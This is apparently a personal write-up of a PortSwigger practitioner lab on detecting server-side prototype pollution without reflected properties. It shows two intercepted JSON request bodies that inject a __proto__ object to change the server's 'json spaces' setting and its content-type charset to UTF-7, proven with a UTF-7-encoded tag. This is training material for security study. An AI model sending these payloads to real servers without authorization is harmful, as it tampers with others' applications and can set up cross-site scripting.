# [Detecting server-side prototype pollution without polluted property reflection] — [PortSwigger] — [Practitioner]
**Date:** 2026-08-05
 
---
 
## Vulnerability / core concept
Server-side Prototype Pollution

---


## Payload / key command
This web application is vulnerable to server-side prototype pollution. To detect this, we can use several options. I used two of them: altering `json spaces` property and altering `content-type` property. I couldn't find an error page which returns 200 OK with `error` object.

When we log in to our account, we have the option to change details about our account. Intercepting this request allows us to edit the JSON body that we are sending to the server.
1) First, I tried to edit the `json spaces` property to detect any difference in the response. I set it value to 8 and inspected RAW request. During inspection we can see that response JSON contains extra space before parameters.
This is the body of the request:
```js
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"+ADw-babek+AD4-",
   "sessionId":"vzvzbmSiR5fmp95i6VL0scQ9yq8fQykC",
   "__proto__":{
      "json spaces":8
   }
}
```
2) The next detection method is using altering `content-type` property of the `Object.prototype`. To do so we need to send the following request:
```js
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"+ADw-babek+AD4-",
   "sessionId":"vzvzbmSiR5fmp95i6VL0scQ9yq8fQykC",
   "__proto__":{
      "content-type":"application/json; charset=utf-7"
   }
}
```
As you can see here, `+ADw-babek+AD4-` is `UTF-7` encoded `<babek>` string. At first I just updated my country value to it. This display this encoded garbage string. Later on, I changed the charset to `UTF-7` and in the response this garbage string appeared as `<babek>`. That means we successfully changed the encoding of the server and proved prototype pollution.

Doing any of these detection methods will solve this lab.
